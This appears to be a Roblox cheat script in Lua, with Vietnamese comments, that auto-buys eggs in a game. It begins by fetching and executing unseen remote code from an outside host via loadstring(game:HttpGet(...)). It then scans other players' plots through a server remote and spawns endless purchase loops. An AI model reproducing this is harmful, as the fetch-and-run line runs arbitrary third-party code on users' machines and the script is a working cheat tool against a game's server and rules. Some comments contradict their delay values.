script_key="TdVwhWpohFRGWfEVbDSwgRifLiopOLOG";
loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
wait(5)
-- CONFIG
local DELAY_BETWEEN_SCAN_CALLS = 0.1   -- giây giữa mỗi call khi quét các plot
local PRINT_VERBOSE = true             -- in log chi tiết
local STOP_ON_FIRST_FOUND = true       -- dừng khi tìm thấy plot

-- 🥚 CẤU HÌNH DELAY RIÊNG CHO TỪNG TRỨNG
-- định dạng: [số_trứng] = delay (giây)
local EGG_DELAYS = {
    [1] = 0.1,    -- trứng 1: spam liên tục
    [2] = 80,     -- trứng 2: 80 giây
    [3] = 200,    -- trứng 3: 300 giây
    [4] = 400,    -- trứng 4: 600 giây
    [5] = 8000,   -- trứng 5: 1000 giây
}

-- SERVICES / PATHS
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local PlotsFolder = workspace:WaitForChild("__THINGS"):WaitForChild("Plots")
local Plots_Invoke = ReplicatedStorage:WaitForChild("Network"):WaitForChild("Plots_Invoke")
local LocalPlayer = Players.LocalPlayer

-- helper: kiểm tra phản hồi server có hợp lệ hay không
local function isValidResponse(res, ok)
    return ok and res ~= nil and res ~= false
end

-- scan tất cả plot hiện có trong workspace.__THINGS.Plots
local function scanPlotsAndFindMine()
    if PRINT_VERBOSE then print("🔍 Bắt đầu quét các plot trong workspace.__THINGS.Plots ...") end

    for _, plot in ipairs(PlotsFolder:GetChildren()) do
        local plotId = plot:GetAttribute("ID") or plot:GetAttribute("PlotID") or tonumber(plot.Name) or plot.Name
        local idNum = tonumber(plotId) or plotId

        if PRINT_VERBOSE then print(("  - Thử plot %s"):format(tostring(idNum))) end

        local args = { idNum, "PurchaseEgg", 1, 3 }

        local ok, res = pcall(function()
            return Plots_Invoke:InvokeServer(unpack(args))
        end)

        if isValidResponse(res, ok) then
            print(("✅ Plot khả dụng phát hiện: %s  | Resp: %s"):format(tostring(idNum), tostring(res)))
            return idNum
        else
            if PRINT_VERBOSE then
                print(("   ✖ Không phải plot của bạn: %s  | ok=%s res=%s"):format(tostring(idNum), tostring(ok), tostring(res)))
            end
        end

        task.wait(DELAY_BETWEEN_SCAN_CALLS)
    end

    print("🔎 Quét xong, không tìm được plot khả dụng.")
    return nil
end

-- spam riêng cho từng trứng
local function startEggThread(plotId, eggSlot, delay)
    task.spawn(function()
        print(("🐣 Bắt đầu spam trứng #%d mỗi %s giây tại plot %s"):format(eggSlot, tostring(delay), tostring(plotId)))

        while true do
            local args = { plotId, "PurchaseEgg", eggSlot, 3 }

            local ok, res = pcall(function()
                return Plots_Invoke:InvokeServer(unpack(args))
            end)

            if ok then
                print(("✅ Mua thành công trứng #%d (resp=%s)"):format(eggSlot, tostring(res)))
            else
                warn(("⚠️ Lỗi khi mua trứng #%d -> %s"):format(eggSlot, tostring(res)))
            end

            task.wait(delay)
        end
    end)
end

-- MAIN
task.spawn(function()
    local foundPlot = scanPlotsAndFindMine()
    if not foundPlot then
        print("❗ Không tìm thấy plot khả dụng. Hãy kiểm tra lại hoặc tăng delay.")
        return
    end

    print(("🚀 Bắt đầu chạy spam theo từng trứng cho plot %s"):format(tostring(foundPlot)))

    -- chạy song song cho từng trứng
    for eggSlot, delay in pairs(EGG_DELAYS) do
        startEggThread(foundPlot, eggSlot, delay)
        task.wait(0.2) -- tránh overload khi khởi tạo
    end
end)

